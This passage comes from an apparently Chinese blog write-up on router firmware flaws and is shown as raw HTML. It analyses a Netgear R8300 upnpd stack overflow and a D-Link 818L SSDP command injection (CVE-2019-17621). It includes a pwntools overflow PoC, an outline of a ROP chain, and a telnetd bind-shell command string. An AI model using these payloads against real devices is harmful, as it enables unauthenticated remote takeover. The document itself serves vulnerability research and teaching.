class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs prolog">......<br>  char v38[<span class="hljs-number">12</span>]; // [sp+<span class="hljs-number">24</span>h] [bp<span class="hljs-number">-634</span>h] <span class="hljs-symbol">BYREF</span><br>  int s[<span class="hljs-number">10</span>]; // [sp+<span class="hljs-number">600</span>h] [bp<span class="hljs-number">-58</span>h] <span class="hljs-symbol">BYREF</span><br>  char *v40; // [sp+<span class="hljs-number">628</span>h] [bp<span class="hljs-number">-30</span>h] <span class="hljs-symbol">BYREF</span><br>  <span class="hljs-symbol">__int16</span> v41; // [sp+<span class="hljs-number">62</span><span class="hljs-symbol">Ch</span>] [bp<span class="hljs-number">-2</span><span class="hljs-symbol">Ch</span>] <span class="hljs-symbol">BYREF</span><br><br>  v41 = <span class="hljs-number">32</span>;<br>  sub_B814(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;%s(%d):\n&quot;</span>, <span class="hljs-string">&quot;ssdp_http_method_check&quot;</span>, <span class="hljs-number">203</span>);<br>  if ( dword_93AE0 == <span class="hljs-number">1</span> )<br>    return <span class="hljs-number">0</span>;<br>  v40 = v38;<br>  strcpy(v38, a1);<br>......<br></code></pre></td></tr></table></figure><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820005128933.png" alt="image-20240820005128933"></p><p>可以看到NX保护已开</p><p>ssd的漏洞公开中提到：</p><p>“路由器已打开 ASLR 缓解措施，我们可以使用 ROP 攻击绕过该缓解措施。但是，我们正在通过使用 <strong>strcpy</strong> 执行复制调用，它对 NULL 字节很敏感，这反过来会阻止我们使用 ROP 攻击。因此，要使用包含 NULL 字节的地址，我们需要使用堆栈重用攻击。”</p><p>链接：<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD 公告 - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD 安全披露 (ssd-disclosure.com)</a></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&quot;192.168.2.2&quot;</span>,<span class="hljs-number">1900</span>,typ=<span class="hljs-string">&#x27;udp&#x27;</span>)<br>payload  = b<span class="hljs-string">&#x27;M-SEARCH * HTTP/1.1 \r\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;Man: &quot;ssdp:discover&quot; \r\n&#x27;</span><br>payload += b<span class="hljs-string">&#x27;MX: %s \r\n&#x27;</span> % (b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">200</span>)<br><span class="hljs-built_in">io</span>.send(payload)<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820012009328.png" alt="image-20240820012009328"></p><p>wireshark抓包看一下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820103700236.png" alt="image-20240820103700236"></p><p>此时可以控制返回地址，但是最后一位归零，原因如下</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.首先溢出覆盖了非叶函数的返回地址。一旦这个函数执行它的结束语来恢复保存的值，保存的<span class="hljs-built_in">LR</span>就被弹出到<span class="hljs-built_in">PC</span>中返回给调用者。<br><span class="hljs-number">2</span>.其次关于最低有效位的一个注意事项：BX指令将加载到<span class="hljs-built_in">PC</span>的地址的LSB复制到CPSR寄存器的T状态位，CPSR寄存器在<span class="hljs-meta">ARM</span>和<span class="hljs-meta">Thumb</span>模式之间切换：<span class="hljs-meta">ARM</span>（LSB<span class="hljs-number">=0</span>）/<span class="hljs-meta">Thumb</span>（LSB<span class="hljs-number">=1</span>）。<br>我们可以看到R8300是运行在<span class="hljs-meta">THUMB</span>状态：<br>当处理器处于<span class="hljs-meta">ARM</span>状态时，每条<span class="hljs-meta">ARM</span>指令为<span class="hljs-number">4</span>个字节，所以<span class="hljs-built_in">PC</span>寄存器的值为当前指令地址 + <span class="hljs-number">8</span>字节<br>当处理器处于<span class="hljs-meta">Thumb</span>状态时，每条<span class="hljs-meta">Thumb</span>指令为<span class="hljs-number">2</span>字节，所以<span class="hljs-built_in">PC</span>寄存器的值为当前指令地址 + <span class="hljs-number">4</span>字节<br>因此保存的<span class="hljs-built_in">LR</span>（用<span class="hljs-number">0x61616161</span>覆盖）被弹出到<span class="hljs-built_in">PC</span>中，然后弹出地址的LSB被写入CPSR寄存器T位（位<span class="hljs-number">5</span>），最后<span class="hljs-built_in">PC</span>本身的LSB被设置为<span class="hljs-number">0</span>，从而产生<span class="hljs-number">0x61616160</span><br></code></pre></td></tr></table></figure><p>这里通过组合两个payload来做到这一点，第一个payload的组成如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">s.<span class="hljs-built_in">send</span>（<span class="hljs-string">&#x27;a\x00&#x27;</span>+expayload）<br></code></pre></td></tr></table></figure><p>在payload的开头发送一个“a\x00”值，以避免触发UPNP漏洞，直到payload位于堆栈中。</p><p>第二个payload将控制 PC 值并将其更改为 <em>0x230f0</em>，并触发堆栈中的第一个paylaod。<em>0x230f0</em> gadget可以控制栈指针</p><p>使用 <code>strcpy</code> 调用在 bss 上拼接出命令字符串 <code>telnetd\x20-l/bin/sh\x20-p\x209999\x20&amp;\x20\x00</code>，并调整 R0 指向这段内存，然后跳转 <code>system</code> 执行即可。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820014425461.png" alt="image-20240820014425461"></p><h4 id="CVE-2019-17621-Dlink-818l-RCE"><a href="#CVE-2019-17621-Dlink-818l-RCE" class="headerlink" title="CVE-2019-17621 Dlink-818l RCE"></a>CVE-2019-17621 Dlink-818l RCE</h4><h5 id="固件模拟-1"><a href="#固件模拟-1" class="headerlink" title="固件模拟"></a>固件模拟</h5><p>FirmAE</p><h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞存在于cgibin中ssdpcgi_main函数</p><p>那么我们如何才能把一个ssdp协议的包发送到后端呢</p><p>打开AE的shell输入netstat -anlp查看</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825194351354.png" alt="image-20240825194351354"></p><p>这里出现了1900，ssdp的标准端口，并且由进程httpd所有</p><p>所以ssdp协议包是由httpd接收并将参数转发给cgibin</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825200611537.png" alt="image-20240825200611537"></p><p>cgibin中main函数从全局变量中获取参数进行比较</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825193826718.png" alt="image-20240825193826718"></p><p>动调</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201519160.png" alt="image-20240825201519160"></p><p>进入ssdpcgi_main</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201602517.png" alt="image-20240825201602517"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201705430.png" alt="image-20240825201705430"></p><p>此时栈上的值</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825201744480.png" alt="image-20240825201744480"></p><p>参数存入寄存器</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202019245.png" alt="image-20240825202019245"></p><p>strncmp比较前0x5的字符是否相等</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202354671.png" alt="image-20240825202354671"></p><p>带参数进入命令执行函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240825202641697.png" alt="image-20240825202641697"></p><p>执行成功</p><p>代码分析</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> __fastcall ssdpcgi_main(<span class="hljs-keyword">int</span> a1)<br>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char *<span class="hljs-number">v2</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s0</span><br>  char *<span class="hljs-number">v3</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s3</span><br>  char *<span class="hljs-number">v4</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$v0</span><br>  char *<span class="hljs-number">v5</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s2</span><br>  const char *<span class="hljs-number">v6</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$s1</span><br>  bool <span class="hljs-number">v7</span>; <span class="hljs-regexp">//</span> dc<br>  char *<span class="hljs-number">v8</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a2</span><br>  const char *<span class="hljs-number">v9</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a0</span><br>  char *<span class="hljs-number">v10</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$a3</span><br><br>  // 初始化结果为-<span class="hljs-number">1</span><br>  result = -<span class="hljs-number">1</span>;<br><br>  <span class="hljs-regexp">//</span> 检查参数a1是否为<span class="hljs-number">2</span>，如果不是则直接返回-<span class="hljs-number">1</span><br>  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;HTTP_ST&quot;</span>的值，并将其赋值给<span class="hljs-number">v2</span><br>    <span class="hljs-number">v2</span> = getenv(<span class="hljs-string">&quot;HTTP_ST&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>的值，并将其赋值给<span class="hljs-number">v3</span><br>    <span class="hljs-number">v3</span> = getenv(<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;REMOTE_PORT&quot;</span>的值，并将其赋值给<span class="hljs-number">v5</span><br>    <span class="hljs-number">v5</span> = getenv(<span class="hljs-string">&quot;REMOTE_PORT&quot;</span>);<br>    <span class="hljs-regexp">//</span> 获取环境变量<span class="hljs-string">&quot;SERVER_ID&quot;</span>的值，并将其赋值给<span class="hljs-number">v4</span><br>    <span class="hljs-number">v4</span> = getenv(<span class="hljs-string">&quot;SERVER_ID&quot;</span>);<br>    <span class="hljs-regexp">//</span> 将<span class="hljs-number">v4</span>赋值给<span class="hljs-number">v6</span><br>    <span class="hljs-number">v6</span> = <span class="hljs-number">v4</span>;<br><br>    <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>、<span class="hljs-number">v3</span>和<span class="hljs-number">v5</span>是否都存在，如果都存在则继续执行<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-number">v2</span> &amp;&amp; <span class="hljs-number">v3</span> &amp;&amp; <span class="hljs-number">v5</span> )<br>    &#123;<br>      <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v4</span>是否为NULL，如果为NULL则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>      <span class="hljs-number">v7</span> = <span class="hljs-number">v4</span> == <span class="hljs-number">0</span>;<br>      <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>      result = -<span class="hljs-number">1</span>;<br>      <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v4</span>不为NULL，继续执行<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>      &#123;<br>        <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>        <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v2</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>        <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>        result = -<span class="hljs-number">1</span>;<br>        <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v2</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>        <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>        &#123;<br>          <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v3</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>          <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v3</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>          <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>          result = -<span class="hljs-number">1</span>;<br>          <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v3</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>          <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>          &#123;<br>            <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v5</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>            <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v5</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>            <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>            result = -<span class="hljs-number">1</span>;<br>            <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v5</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>            <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>            &#123;<br>              <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v6</span>字符串中是否包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，如果包含则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>              <span class="hljs-number">v7</span> = strchr(<span class="hljs-number">v6</span>, <span class="hljs-number">96</span>) != <span class="hljs-number">0</span>;<br>              <span class="hljs-regexp">//</span> 初始化结果为-<span class="hljs-number">1</span><br>              result = -<span class="hljs-number">1</span>;<br>              <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为false，则说明<span class="hljs-number">v6</span>字符串中不包含字符<span class="hljs-string">&#x27; ` &#x27;</span>，继续执行<br>              <span class="hljs-keyword">if</span> ( !<span class="hljs-number">v7</span> )<br>              &#123;<br>                <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">8</span>个字符是否与<span class="hljs-string">&quot;ssdp:all&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;ssdp:all&quot;</span>, 8u) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> ssdpall <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> ssdpall <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br><br>LABEL_14:<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v5</span>赋值给<span class="hljs-number">v10</span><br>                  <span class="hljs-number">v10</span> = <span class="hljs-number">v5</span>;<br><br>LABEL_23:<br>                  <span class="hljs-regexp">//</span> 调用lxmldbc_system函数，参数为<span class="hljs-number">v9</span>、<span class="hljs-string">&quot;/etc/scripts/upnp/M-SEARCH.sh&quot;</span>、<span class="hljs-number">v8</span>和<span class="hljs-number">v10</span><br>                  lxmldbc_system(<span class="hljs-number">v9</span>, <span class="hljs-string">&quot;/etc/scripts/upnp/M-SEARCH.sh&quot;</span>, <span class="hljs-number">v8</span>, <span class="hljs-number">v10</span>);<br>                  <span class="hljs-regexp">//</span> 返回<span class="hljs-number">0</span><br>                  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">15</span>个字符是否与<span class="hljs-string">&quot;upnp:rootdevice&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;upnp:rootdevice&quot;</span>, 0xFu) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> rootdevice <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> rootdevice <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_14<br>                  <span class="hljs-keyword">goto</span> LABEL_14;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">5</span>个字符是否与<span class="hljs-string">&quot;uuid:&quot;</span>相同，如果相同则执行以下操作<br>                <span class="hljs-keyword">if</span> ( !strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;uuid:&quot;</span>, 5u) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> uuid <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> uuid <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br><br>LABEL_22:<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v5</span>赋值给<span class="hljs-number">v10</span><br>                  <span class="hljs-number">v10</span> = <span class="hljs-number">v5</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_23<br>                  <span class="hljs-keyword">goto</span> LABEL_23;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">4</span>个字符是否与<span class="hljs-string">&quot;urn:&quot;</span>相同，如果不相同则将<span class="hljs-number">v7</span>设置为true，否则设置为false<br>                <span class="hljs-number">v7</span> = strncmp(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;urn:&quot;</span>, 4u) != <span class="hljs-number">0</span>;<br>                <span class="hljs-regexp">//</span> 初始化结果为<span class="hljs-number">0</span><br>                result = <span class="hljs-number">0</span>;<br><br>                <span class="hljs-regexp">//</span> 如果<span class="hljs-number">v7</span>为true，则说明<span class="hljs-number">v2</span>字符串的前<span class="hljs-number">4</span>个字符不与<span class="hljs-string">&quot;urn:&quot;</span>相同，直接返回结果<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-number">v7</span> )<br>                  <span class="hljs-keyword">return</span> result;<br><br>                <span class="hljs-regexp">//</span> 检查<span class="hljs-number">v2</span>字符串中是否包含<span class="hljs-string">&quot;:device:&quot;</span>，如果包含则执行以下操作<br>                <span class="hljs-keyword">if</span> ( strstr(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;:device:&quot;</span>) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> devices <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> devices <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_22<br>                  <span class="hljs-keyword">goto</span> LABEL_22;<br>                &#125;<br><br>                // 检查<span class="hljs-number">v2</span>字符串中是否包含<span class="hljs-string">&quot;:service:&quot;</span>，如果包含则执行以下操作<br>                <span class="hljs-keyword">if</span> ( strstr(<span class="hljs-number">v2</span>, <span class="hljs-string">&quot;:service:&quot;</span>) )<br>                &#123;<br>                  <span class="hljs-regexp">//</span> 将<span class="hljs-number">v3</span>赋值给<span class="hljs-number">v8</span><br>                  <span class="hljs-number">v8</span> = <span class="hljs-number">v3</span>;<br>                  <span class="hljs-regexp">//</span> 将字符串<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> services <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>赋值给<span class="hljs-number">v9</span><br>                  <span class="hljs-number">v9</span> = <span class="hljs-string">&quot;<span class="hljs-variable">%s</span> services <span class="hljs-variable">%s</span>:<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span> &amp;&quot;</span>;<br>                  <span class="hljs-regexp">//</span> 跳转到LABEL_22<br>                  <span class="hljs-keyword">goto</span> LABEL_22;<br>                &#125;<br><br>                // 返回<span class="hljs-number">0</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>    // 否则，返回-<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>    &#125;<br>  &#125;<br>  // 返回结果<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数 <code>ssdpcgi_main</code> 的作用是解析来自 UPnP 设备的 M-SEARCH 请求，根据请求内容调用相应的脚本进行处理，最终生成 UPnP 响应消息</p><h6 id="函数逻辑"><a href="#函数逻辑" class="headerlink" title="函数逻辑"></a>函数逻辑</h6><ol><li><strong>获取环境变量：</strong> 函数首先获取几个重要的环境变量：<ul><li><code>HTTP_ST</code>: 搜索目标 (Search Target)，用于标识搜索的设备类型或服务类型。</li><li><code>REMOTE_ADDR</code>: 请求的源 IP 地址。</li><li><code>REMOTE_PORT</code>: 请求的源端口号。</li><li><code>SERVER_ID</code>: 服务器的标识符。</li></ul></li><li><strong>检查请求格式：</strong> 函数检查这些环境变量的值是否符合 UPnP 协议的规范，例如：<ul><li>检查 <code>HTTP_ST</code>、<code>REMOTE_ADDR</code> 和 <code>REMOTE_PORT</code> 是否存在。</li><li>检查这些环境变量的值是否包含非法字符 <code> </code> (空格)。</li></ul></li><li><strong>解析搜索目标：</strong> 函数根据 <code>HTTP_ST</code> 的值解析搜索目标类型，并调用相应的脚本进行处理：<ul><li><strong>“ssdp:all”</strong>: 搜索所有设备，调用 <code>/etc/scripts/upnp/M-SEARCH.sh</code> 脚本。</li><li><strong>“upnp:rootdevice”</strong>: 搜索根设备</li><li><strong>“uuid:”</strong>: 搜索特定设备</li><li><strong>“urn:”</strong>: 搜索特定设备或服务</li></ul></li><li><strong>调用脚本：</strong> 函数使用 <code>lxmldbc_system</code> 函数调用相应的脚本，并将环境变量值作为参数传递给脚本。</li></ol><p>这里的漏洞点在于它直接将用户输入的 <code>HTTP_ST</code> 环境变量值拼接进 shell 命令中，然后使用 <code>lxmldbc_system</code> 函数执行该命令。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134331890.png" alt="image-20240823134331890"></p><p>这里可以看出v2（也就是那个ssdp包），不能包含上面三个标红框的参数，否则会被覆盖，并且必须包含<code>urn:</code>，否则函数会return0，继续往下走，好像无论包含不包含<code>：device：</code>,v2都会被覆盖，查看汇编：</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240823134635202.png" alt="image-20240823134635202"></p><p>假设包含device，这里的beq不进行跳转，继续往下走，跳到40e338</p><p><img 